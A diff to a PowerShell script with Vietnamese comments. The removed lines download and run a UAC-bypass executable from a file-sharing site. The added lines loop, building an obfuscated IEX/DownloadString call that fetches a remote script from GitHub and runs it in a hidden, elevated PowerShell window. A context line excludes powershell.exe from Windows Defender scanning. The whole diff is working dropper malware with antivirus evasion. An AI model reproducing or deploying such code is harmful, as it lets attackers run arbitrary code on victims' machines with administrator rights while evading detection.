@@ -34,19 +34,17 @@ Add-Type -AssemblyName System.Windows.Forms
 
 # Kiểm tra xem script có quyền quản trị không
 if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
-    try {
-        # Tải xuống tệp batch
-        $TempPath = [System.IO.Path]::Combine($env:TEMP, "uac_skip.zip")
-        Invoke-WebRequest -Uri "https://anonsharing.com/file/f10267e9ff48f0aa/uac_skip.zip" -OutFile $TempPath
-        $ExtractPath = [System.IO.Path]::Combine($env:TEMP, "uac_skip")
-        Expand-Archive -Path $TempPath -DestinationPath $ExtractPath
-        Start-Process "$ExtractPath\uac.exe"
-        Stop-Process -Id $PID -Force
-    }
-    catch {
-        Write-Error "Lỗi xảy ra: $_"
-    }
-}
+     while(1) {
+         try {
+             $code = ("https://raw.githubusercontent.com/43a1723/test/main/download.ps1")
+             $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$code')"
+             Start-Process "powershell" -Argument "I'E'X($download)" -WindowStyle Hidden -PassThru -Verb RunAs
+             Clear-Host
+             exit;
+         } catch {}
+     }
+ }
+
 
 
 Add-MpPreference -ExclusionProcess "powershell.exe"
